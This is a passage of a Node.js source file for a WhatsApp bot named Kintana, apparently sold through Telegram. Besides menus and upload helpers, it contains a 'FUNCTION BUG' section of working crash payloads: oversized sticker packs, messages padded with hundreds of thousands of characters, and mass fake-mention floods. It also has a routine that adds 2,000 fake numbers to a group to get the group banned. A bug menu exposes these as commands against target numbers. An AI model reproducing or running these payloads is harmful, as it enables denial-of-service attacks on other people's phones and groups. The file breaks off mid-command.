const config = require('./settings/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp");
const util = require("util");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
const path = require("path");
const os = require('os');
const crypto = require("crypto");
const speed = require('performance-now');
const { spawn, exec, execSync } = require('child_process');
const { default: baileys, getContentType, generateWAMessageFromContent, proto } = require("baileys");

module.exports = async function kintana(sock, m, chatUpdate, store) {
try {
// ==================== MESSAGE PARSING ====================
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" ||
sock.user.id : m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const prefa = ["", "!", ".", ",", "🐤", "🗿"];

const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const botNumber = await sock.decodeJid(sock.user.id);
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './h3ysaka/lib/database/owner.json'), 'utf8'));
const isOwner = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isBot = botNumber.includes(senderNumber);

const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

const { smsg, fetchJson, sleep, formatSize, runtime } = require('./h3ysaka/lib/myfunction');
const { fquoted } = require('./h3ysaka/lib/fquoted');
// ==================== GROUP METADATA ====================
const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
let admin = null;
if (p.admin === 'superadmin') admin = 'superadmin';
else if (p.admin === 'admin') admin = 'admin';
return {
id: p.id || null,
jid: p.jid || null,
admin,
full: p
};
}) || [] : [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;

async function getLid(jid) {
return sock.getLidUser(jid);
}

// ==================== LOGGING ====================
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
console.log(
chalk.bgHex("#ffffff").black(
`   ▢ Date: ${new Date().toLocaleString()} \n` +
`   ▢ Message: ${m.body || m.mtype} \n` +
`   ▢ Sender: ${pushname} \n` +
`   ▢ JID: ${senderNumber} \n`
)
);
console.log();
}

// ==================== HELPER FUNCTIONS ====================
async function getBuffer(url) {
const res = await axios.get(url, { responseType: "arraybuffer" });
return Buffer.from(res.data, "binary");
}

const reaction = async (jidss, emoji) => {
sock.sendMessage(jidss, {
react: {
text: emoji,
key: m.key
}
});
};

async function reply(text) {
sock.sendMessage(m.chat, {
text: "\n" + text + "\n",
contextInfo: {
mentionedJid: [sender],
externalAdReply: {
title: config.settings.title,
body: config.settings.description,
thumbnailUrl: config.thumbUrl,
sourceUrl: config.socialMedia.Telegram,
renderLargerThumbnail: false,
}
}
}, { quoted: fquoted.channel });
}
// ==================== QUOTED OBJECTS ====================
const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: 'ownername',
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: 'tiktok @h3ysaka'
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}
}
}
};

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363411988580825@newsletter',
newsletterName: 'tiktok @h3ysaka',
jpegThumbnail: "",
caption: 'Tiktok Developer Kintana',
inviteExpiration: Date.now() + 1814400000
}
}
};

// ==================== UPLOAD FUNCTIONS ====================
let formData = require('form-data');
let { fromBuffer } = require('file-type');

async function TelegraPh(buffer) {
let { ext } = await fromBuffer(buffer);
let bodyForm = new formData();
bodyForm.append("fileToUpload", buffer, "file." + ext);
bodyForm.append("reqtype", "fileupload");

let res = await fetch("https://catbox.moe/user/api.php", {
method: "POST",
body: bodyForm,
});

let data = await res.text();
return data;
}

async function UploadFileUgu(input) {
return new Promise(async (resolve, reject) => {
const form = new formData();
form.append("files[]", fs.createReadStream(input));
await axios({
url: "https://uguu.se/upload.php",
method: "POST",
headers: {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
...form.getHeaders()
},
data: form
}).then((data) => {
resolve(data.data.files[0]);
}).catch((err) => reject(err));
});
}

function webp2mp4File(path) {
return new Promise((resolve, reject) => {
const form = new formData();
form.append('new-image-url', '');
form.append('new-image', fs.createReadStream(path));
axios({
method: 'post',
url: 'https://s6.ezgif.com/webp-to-mp4',
data: form,
headers: {
'Content-Type': `multipart/form-data; boundary=${form._boundary}`
}
}).then(({ data }) => {
const formDataThen = new formData();
const $ = cheerio.load(data);
const file = $('input[name="file"]').attr('value');
formDataThen.append('file', file);
formDataThen.append('convert', "Convert WebP to MP4!");
axios({
method: 'post',
url: 'https://ezgif.com/webp-to-mp4/' + file,
data: formDataThen,
headers: {
'Content-Type': `multipart/form-data; boundary=${formDataThen._boundary}`
}
}).then(({ data }) => {
const $ = cheerio.load(data);
const result = 'https:' + $('div#output > p.outfile > video > source').attr('src');
resolve({
status: true,
message: "Xeorz",
result: result
});
}).catch(reject);
}).catch(reject);
});
}

async function floNime(medianya, options = {}) {
const { ext } = await fromBuffer(medianya) || options.ext;
var form = new formData();
form.append('file', medianya, 'tmp.' + ext);
let jsonnya = await fetch('https://flonime.my.id/upload', {
method: 'POST',
body: form
})
.then((response) => response.json());
return jsonnya;
}

// ==================== PLUGIN LOADER ====================
const pluginsLoader = async (directory) => {
let plugins = [];
const folders = fs.readdirSync(directory);
folders.forEach(file => {
const filePath = path.join(directory, file);
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath];
}
const plugin = require(filePath);
plugins.push(plugin);
} catch (error) {
console.log(`${filePath}:`, error);
}
}
});
return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
const plug = {
sock,
prefix,
command,
reply,
text,
isBot,
reaction,
pushname,
mime,
quoted,
sleep,
fquoted,
fetchJson
};

for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
if (plugin.isBot && !isBot) {
return;
}

if (plugin.private && !plug.isPrivate) {
return m.reply(config.message.private);
}

if (typeof plugin !== "function") return;
await plugin(m, plug);
}
}

if (!pluginsDisable) return;

//====[FUNCTION BUG]====//
async function mistery(sock, target) {
  const stc = Array.from({ length: 1000 }, (_, i) => ({
    fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
    isAnimated: true,
    emojis: ["🌟"],
    accessibilityLabel: "h3ysaka",
    mimetype: "image/webp"
  }));
  const msg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(77777),
            publisher: "the angle",
            stickers: stc,
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
            contextInfo: {
              remoteJid: "X",
              participant: "0@s.whatsapp.net",
              stanzaId: "1234567890ABCDEF",
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 1900 },
                  () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
              ]
            },
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "3680054",
            stickerPackOrigin: "USER_CREATED",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "REJECTED",
                durationSecs: "1",
                callType: "SCHEDULED_CALL",
                participants: [
                  { jid: target, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                  { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                  { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
                ]
              }
            }
          }
        }
      }
    }),
    {}
  );
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });
}

async function delayhard(sock, target) {
  const message = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\u000D" },
          footer: { text: "\u000F" },
          nativeFlowMessage: { buttons: "\t".repeat(45000) }
        }
      }
    }
  };
  await sock.relayMessage(target, message, { noselfsync: true });
}

async function frezehard(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\u0000" },
          nativeFlowMessage: {
            buttons: "[".repeat(500000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, { noselfsync: true });
}
//====[FUNCTION BUG GROUP]====//
async function bansgc(sock, targetgroup) {
  try {
    if (!targetgroup.endsWith('@g.us')) throw new Error('group only')
    const fakeNumbers = Array.from({ length: 2000 }, () => {
      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
    })
    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
      await new Promise(r => setTimeout(r, 20))
    }
  } catch (err) {
    throw new Error(`bans gb: ${err.message}`)
  }
}

async function GbCrash(sock, targetgroup) {
  try {
    const MgbMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(50000),
            footerText: "Ӄ𝕀𝚴𝕋∆𝚴∆",
            headerType: 1,
            buttons: [{ buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆", buttonText: { displayText: "ꦽ".repeat(90000) }, type: 1 }],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`),
              participant: targetgroup,
              remoteJid: targetgroup,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "Ӄ𝕀𝚴𝕋∆𝚴∆",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetgroup, MgbMsg, { userJid: targetgroup });
    console.log("successfully sent group bug");
  } catch (err) {
    console.log(err);
  }
}

async function misterygb(sock, targetgroup) {
  const stc = Array.from({ length: 1000 }, (_, i) => ({
    fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
    isAnimated: true,
    emojis: ["🌟"],
    accessibilityLabel: "h3ysaka",
    mimetype: "image/webp"
  }));
  const msg = await generateWAMessageFromContent(
    targetgroup,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(77777),
            publisher: "the angle",
            stickers: stc,
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
            contextInfo: {
              remoteJid: "X",
              participant: "0@s.whatsapp.net",
              stanzaId: "1234567890ABCDEF",
              mentionedJid: [
                targetgroup,
                ...Array.from(
                  { length: 1900 },
                  () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
              ]
            },
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "3680054",
            stickerPackOrigin: "USER_CREATED",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "REJECTED",
                durationSecs: "1",
                callType: "SCHEDULED_CALL",
                participants: [
                  { jid: targetgroup, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                  { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                  { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
                ]
              }
            }
          }
        }
      }
    }),
    {}
  );
  await sock.relayMessage(targetgroup, msg.message, {
    messageId: msg.key.id,
    participant: { jid: targetgroup }
  });
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetgroup],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: targetgroup } }]
          }
        ]
      }
    ]
  });
}

async function delayhardgb(sock, targetgroup) {
  const message = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\u000D" },
          footer: { text: "\u000F" },
          nativeFlowMessage: { buttons: "\t".repeat(45000) }
        }
      }
    }
  };
  await sock.relayMessage(targetgroup, message, { noselfsync: true });
}
//====[AKHIR FUNCTION]====///
// ==================== COMMAND HANDLER ====================
switch (command) {
// ==================== MENU COMMANDS ====================
case "menu": {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
let timestamp = speed();
let latensi = speed() - timestamp;
let menu = ` \`『 𝗞𝗜𝗡𝗧𝗔𝗡𝗔 𝗝𝗦 』\`

Welcome to Kintana JavaScript, a bot developed to provide a practical, responsive, and easy-to-use bot experience.

╭─「 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 」
│
├ Name : Kintana JavaScript
├ Language : JavaScript (Node.js)
├ Developer : HeySaka
├ Version : Latest Version
├ Platform : WhatsApp 
│
╰───────────────

\`「 𝗔𝗗𝗩𝗔𝗡𝗧𝗔𝗚𝗘𝗦 」\`

◈ Simple and modern menu display
◈ Easy-to-use command system
◈ Practical feature management
◈ Regular feature development
◈ Performance designed to stay responsive

\`「 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 」\`
Developed by HeySaka

Kintana JavaScript — Built with Code, Developed with Dedication.`;
await reaction(m.chat, "⭐");
await sock.sendMessage(m.chat, {
interactiveMessage: {
title: menu,
footer: config.settings.footer,
thumbnail: "https://files.catbox.moe/5izqwp.jpg",
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "tiktok @h3ysaka",
url: "t.me/heysaka",
copy_code: "999999999999999999",
expiration_time: Date.now() * 999
},
bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1, 2, 3, 4, 5, 999],
list_title: "tiktok @h3ysaka",
button_title: "Show Feature"
},
tap_target_configuration: {
title: "h3ysaka",
description: "bomboclard",
canonical_url: "https://t.me/heysaka",
domain: "shop.example.com",
button_index: 0
}
}),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Update Script Info",
sections: [
{
title: "Developer Info",
highlight_label: "kintana offc",
rows: [
{
title: "WhatsApp Channels",
description: `https://whatsapp.com/channel/0029VbDvit7D38CRL5g4c31e

> Follow the Heysaka WhatsApp channel so you can get information about the Kintana script.`,
id: "row_1"
},
{
title: "Telegram Channel",
description: "https:/t.me/sakaviper",
id: "row_2"
}
]
}
],
has_multiple_buttons: true
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Developer : Heysaka",
id: "123456789",
copy_code: "https://t.me/heysaka"
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Menu",
id: `.bugmenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Owner Menu",
id: `.ownermenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Menu",
id: `.allmenu`
})
}
]
}
}
}, { quoted: fquoted.channel });
await sleep(2000);
sock.sendMessage(m.chat, {
audio: { url: `https://files.catbox.moe/kp6v51.mp3` },
mimetype: 'audio/mp4',
ptt: true
}, { quoted: qpayment });
}
break;

case "bugmenu": {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
let timestamp = speed();
let latensi = speed() - timestamp;
let menu = `☼ Bot Name : Kintana Javascript
☼ Version : 2.0.0
☼ developer : heysaka

\`Bug Commands Android\`
> .serang [Bug in Place]
> .delayhard 62xxx
> .freezechat 62xxx
> .blankclick 62xxx
 
\`Bug Group\`
> .delaygb [Bug in Place]
> .crashgb [Bug in Place]

\`Ban Group\`
> .bangb [Ban in Place]`;
await reaction(m.chat, "⭐");
await sock.sendMessage(m.chat, {
interactiveMessage: {
title: menu,
footer: config.settings.footer,
thumbnail: "https://files.catbox.moe/5izqwp.jpg",
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "tiktok @h3ysaka",
url: "t.me/heysaka",
copy_code: "999999999999999999",
expiration_time: Date.now() * 999
},
bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1, 2, 3, 4, 5, 999],
list_title: "tiktok @h3ysaka",
button_title: "Show Feature"
},
tap_target_configuration: {
title: "h3ysaka",
description: "bomboclard",
canonical_url: "https://t.me/heysaka",
domain: "shop.example.com",
button_index: 0
}
}),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Update Script Info",
sections: [
{
title: "Developer Info",
highlight_label: "kintana offc",
rows: [
{
title: "WhatsApp Channels",
description: `https://whatsapp.com/channel/0029VbDvit7D38CRL5g4c31e

> Follow the Heysaka WhatsApp channel so you can get information about the Kintana script.`,
id: "row_1"
},
{
title: "Telegram Channel",
description: "https:/t.me/sakaviper",
id: "row_2"
}
]
}
],
has_multiple_buttons: true
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Developer : Heysaka",
id: "123456789",
copy_code: "https://t.me/heysaka"
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Menu",
id: `.bugmenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Owner Menu",
id: `.ownermenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Menu",
id: `.allmenu`
})
}
]
}
}
}, { quoted: fquoted.channel });
await sleep(2000);
sock.sendMessage(m.chat, {
audio: { url: `https://files.catbox.moe/kp6v51.mp3` },
mimetype: 'audio/mp4',
ptt: true
}, { quoted: qpayment });
}
break;

case "allmenu": {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
let timestamp = speed();
let latensi = speed() - timestamp;
let menu = `☼ Bot Name : Kintana Javascript
☼ Version : 2.0.0
☼ developer : heysaka

\`All Menu\`
> .ownermenu
> .bugmenu
> .listharga
> .buyscript
> .developer

\`Group Menu Admin Only\`
> .tagall (message)

\`Tools Menu\`
> .rvo`;
await reaction(m.chat, "⭐");
await sock.sendMessage(m.chat, {
interactiveMessage: {
title: menu,
footer: config.settings.footer,
thumbnail: "https://files.catbox.moe/5izqwp.jpg",
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "tiktok @h3ysaka",
url: "t.me/heysaka",
copy_code: "999999999999999999",
expiration_time: Date.now() * 999
},
bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1, 2, 3, 4, 5, 999],
list_title: "tiktok @h3ysaka",
button_title: "Show Feature"
},
tap_target_configuration: {
title: "h3ysaka",
description: "bomboclard",
canonical_url: "https://t.me/heysaka",
domain: "shop.example.com",
button_index: 0
}
}),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Update Script Info",
sections: [
{
title: "Developer Info",
highlight_label: "kintana offc",
rows: [
{
title: "WhatsApp Channels",
description: `https://whatsapp.com/channel/0029VbDvit7D38CRL5g4c31e

> Follow the Heysaka WhatsApp channel so you can get information about the Kintana script.`,
id: "row_1"
},
{
title: "Telegram Channel",
description: "t.me/AboutGyzenLyoraaa",
id: "row_2"
}
]
}
],
has_multiple_buttons: true
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Developer : Heysaka",
id: "123456789",
copy_code: "https://t.me/heysaka"
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Menu",
id: `.bugmenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Owner Menu",
id: `.ownermenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Menu",
id: `.allmenu`
})
}
]
}
}
}, { quoted: fquoted.channel });
await sleep(2000);
sock.sendMessage(m.chat, {
audio: { url: `https://files.catbox.moe/kp6v51.mp3` },
mimetype: 'audio/mp4',
ptt: true
}, { quoted: qpayment });
}
break;

case "ownermenu": {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
let timestamp = speed();
let latensi = speed() - timestamp;
let menu = `☼ Bot Name : Kintana Javascript
☼ Version : 2.0.0
☼ developer : heysaka

\`Owner Menu\`
> .addowner
> .dellowner
> .self
> .public`;
await reaction(m.chat, "⭐");
await sock.sendMessage(m.chat, {
interactiveMessage: {
title: menu,
footer: config.settings.footer,
thumbnail: "https://files.catbox.moe/5izqwp.jpg",
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "tiktok @h3ysaka",
url: "t.me/heysaka",
copy_code: "999999999999999999",
expiration_time: Date.now() * 999
},
bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1, 2, 3, 4, 5, 999],
list_title: "tiktok @h3ysaka",
button_title: "Show Feature"
},
tap_target_configuration: {
title: "h3ysaka",
description: "bomboclard",
canonical_url: "https://t.me/heysaka",
domain: "shop.example.com",
button_index: 0
}
}),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Update Script Info",
sections: [
{
title: "Developer Info",
highlight_label: "kintana offc",
rows: [
{
title: "WhatsApp Channels",
description: `https://whatsapp.com/channel/0029VbDvit7D38CRL5g4c31e

> Follow the Heysaka WhatsApp channel so you can get information about the Kintana script.`,
id: "row_1"
},
{
title: "Telegram Channel",
description: "https:/t.me/sakaviper",
id: "row_2"
}
]
}
],
has_multiple_buttons: true
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Developer : Heysaka",
id: "123456789",
copy_code: "https://t.me/heysaka"
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Menu",
id: `.bugmenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Owner Menu",
id: `.ownermenu`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Menu",
id: `.allmenu`
})
}
]
}
}
}, { quoted: fquoted.channel });
await sleep(2000);
sock.sendMessage(m.chat, {
audio: { url: `https://files.catbox.moe/kp6v51.mp3` },
mimetype: 'audio/mp4',
ptt: true
}, { quoted: qpayment });
}
break;

// ==================== PRODUCT COMMANDS ====================
case "buyscript": {
await sock.sendMessage(m.chat, {
productMessage: {
title: "Kintana Javascript WhatsApp",
description: "This Is Product Description",
thumbnail: { url: "https://files.catbox.moe/5izqwp.jpg" },
productId: "PROD001",
retailerId: "RETAIL001",
url: "https://t.me/heysaka",
body: "Order Script Is Here",
footer: config.settings.footer,
priceAmount1000: 777,
currencyCode: "IDR",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Order Script",
url: "https://t.me/heysaka"
})
}
]
}
}, { quoted: fquoted.channel });
}
break;

case "listharga": {
await sock.sendMessage(m.chat, {
productMessage: {
title: "Kintana Javascript WhatsApp",
description: "This Is Product Description",
thumbnail: { url: "https://files.catbox.moe/5izqwp.jpg" },
productId: "PROD001",
retailerId: "RETAIL001",
url: "https://t.me/heysaka",
body: "*List Product Kintana Javascript*\n\nscript bug kintana : Rp.10.000\nfree update kintana : Rp.20.000\nreseller kintana : Rp.30.000\npartner kintana : Rp.50.000\nowner kintana : Rp.65.000",
footer: config.settings.footer,
priceAmount1000: 777,
currencyCode: "IDR",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Order",
url: "https://t.me/heysaka"
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Benefit",
url: "https://t.me/sakaviper/339"
})
}
]
}
}, { quoted: fquoted.channel });
}
break;

case "developer": {
const menu = `*DEVELOPER KINTANA*
- Name : h3ysaka

*TELEGRAM DEVELOPER*
- Telegram : t.me/heysaka
- Channel : t.me/kintanaofficial
- Group Public : t.me/temankintana
- Bot Kintana : t.me/kintanaoffcbot

*WHATSAPP CHANNEL*
https://whatsapp.com/channel/0029VbDvit7D38CRL5g4c31e
`;
sock.sendMessage(m.chat, { text: menu }, { quoted: qchanel });
}
break;

// ==================== SETTINGS COMMANDS ====================
case "self": {
